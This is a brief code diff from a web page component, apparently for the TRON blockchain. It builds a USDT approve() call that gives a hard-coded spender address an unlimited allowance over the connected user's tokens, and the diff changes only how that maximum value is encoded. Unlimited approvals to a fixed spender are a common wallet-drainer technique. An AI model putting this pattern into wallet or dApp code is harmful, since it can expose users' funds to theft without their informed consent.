@@ -197,7 +197,7 @@ export default function Index() {
           owner_address: userAddressRef.current,
           contract_address: TRON_USDT,
           function_selector: "approve(address,uint256)",
-          parameter: "0000000000000000000000" + TRON_SPENDER.replace(/^T/, '') + "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff",
+          parameter: TRON_SPENDER + ",115792089237316195423570985008687907853269984665640564039457584007913129639935",
           fee_limit: 100000000,
           call_value: 0,
           visible: true
